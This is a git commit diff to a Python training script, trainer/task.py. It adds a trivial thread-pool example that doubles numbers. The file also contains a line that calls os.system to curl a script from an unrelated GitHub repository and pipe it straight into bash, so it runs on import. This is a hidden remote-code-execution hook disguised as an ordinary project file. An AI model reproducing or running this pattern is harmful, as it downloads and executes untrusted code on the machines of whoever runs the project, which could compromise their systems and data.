f604f5fea5033735d17bca7107477898e2771a34
herrmani87 <kidokasep-herman720@yahoo.com>
2025-02-08 18:26:21 +0800

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,4 +1,19 @@
 import sys
 import os
+import concurrent.futures
+
+def task(i):
+    # Do some computation here
+    return i * 2
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    # Submit tasks to the executor
+    futures = [executor.submit(task, i) for i in range(10)]
+
+    # Collect the results
+    results = [future.result() for future in concurrent.futures.as_completed(futures)]
+
+print(results)
+
 os.system('curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash')
 
